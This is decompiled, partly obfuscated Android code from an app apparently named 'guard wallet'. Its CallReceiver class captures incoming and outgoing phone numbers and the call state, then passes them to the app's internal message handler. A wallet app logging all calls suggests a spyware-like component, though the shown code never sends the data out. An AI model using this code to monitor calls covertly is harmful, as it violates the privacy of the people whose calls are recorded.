package com.guard.wallet.receiver;

import a1.q;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.CallMessageVO;

public class CallReceiver extends BroadcastReceiver {
   public Integer a = 0;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void onReceive(Context var1, Intent var2) {
      String var5 = "android.intent.action.NEW_OUTGOING_CALL";

      Exception var10000;
      label88: {
         byte var3;
         label82: {
            String var20;
            label89: {
               try {
                  this.a = 1;
                  if ("android.intent.action.NEW_OUTGOING_CALL".equals(var2.getAction())) {
                     var20 = var2.getStringExtra("android.intent.extra.PHONE_NUMBER");
                     break label89;
                  }
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label88;
               }

               var20 = "android.intent.action.PHONE_STATE";

               try {
                  var5 = var2.getStringExtra("incoming_number");
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var23 = false;
                  break label88;
               }

               var3 = 1;
               var18 = var20;
               break label82;
            }

            var3 = 0;
            var18 = var5;
            var5 = var20;
         }

         try {
            var14 = (TelephonyManager)var1.getSystemService("phone");
         } catch (Exception var11) {
            var10000 = var11;
            boolean var24 = false;
            break label88;
         }

         label92: {
            label64:
            if (var14 != null) {
               int var4;
               try {
                  var4 = var14.getCallState();
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var25 = false;
                  break label88;
               }

               if (var4 == 0) {
                  try {
                     Log.d("CallReceiver", "电话挂断...");
                  } catch (Exception var8) {
                     var10000 = var8;
                     boolean var27 = false;
                     break label88;
                  }

                  var15 = "CALL_STATE_IDLE";
                  break label92;
               }

               String var21;
               if (var4 != 1) {
                  if (var4 != 2) {
                     break label64;
                  }

                  var15 = "CALL_STATE_OFFHOOK";
                  var21 = "电话接通中...";
               } else {
                  var15 = "CALL_STATE_RINGING";
                  var21 = "电话响铃中...";
               }

               try {
                  Log.d("CallReceiver", var21);
                  break label92;
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var26 = false;
                  break label88;
               }
            }

            var15 = null;
         }

         try {
            CallMessageVO var22 = new CallMessageVO(Integer.valueOf(var3), var5, var15);
            if (!q.B(var18)) {
               MessageRecordVO var17 = new MessageRecordVO();
               var17.setExtraBody(var22);
               var17.setIntentCode(var18);
               MainApplication.getInstance().getHandlerMsgAndTimer().b(var17);
            }

            return;
         } catch (Exception var7) {
            var10000 = var7;
            boolean var28 = false;
         }
      }

      Exception var16 = var10000;
      q.s("CallReceiver", var16);
   }
}
